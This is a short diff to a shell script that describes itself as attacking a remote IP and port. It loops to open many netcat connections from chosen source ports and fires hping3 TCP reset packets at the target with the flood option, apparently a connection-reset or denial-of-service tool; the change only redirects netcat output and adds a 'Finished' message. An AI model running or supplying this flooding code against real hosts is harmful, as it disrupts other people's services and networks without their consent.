@@ -83,11 +83,12 @@ echo "Attacking remote $ip_destination and port $port"
 iterator=1;
 
 while [ $iterator -lt $count ]; do
-  nc -p $(($iterator+200)) $ip_destination $port 2>&1 &
+  nc -p $(($iterator+200)) $ip_destination $port > /dev/null 2>&1 &
   hping3 -V -c 1 -M 0 -s $(($iterator+200)) -R "$ip_destination" -p "$port" --flood >> /var/log/hping3.log 2>&1 &
   sleep $interval > /dev/null
   iterator=$(( $iterator+1 ))
 done
+echo "Finished"
 
 echo "Killing all involved processes"
 
